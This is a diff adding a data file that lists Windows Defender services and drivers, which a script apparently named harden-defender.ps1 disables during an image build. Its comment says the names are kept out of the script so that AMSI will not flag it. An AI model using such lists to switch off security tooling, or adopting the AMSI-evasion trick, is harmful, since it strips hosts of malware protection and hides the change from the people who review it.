@@ -1,0 +1,9 @@
+# Service/driver keys disabled (Start=4) by harden-defender.ps1, one per line.
+# Kept as data, not as script literals, so the orchestrator's text carries no
+# signature the host AMSI would flag when it runs during a golden build.
+WinDefend
+WdNisSvc
+Sense
+WdFilter
+WdBoot
+WdNisDrv
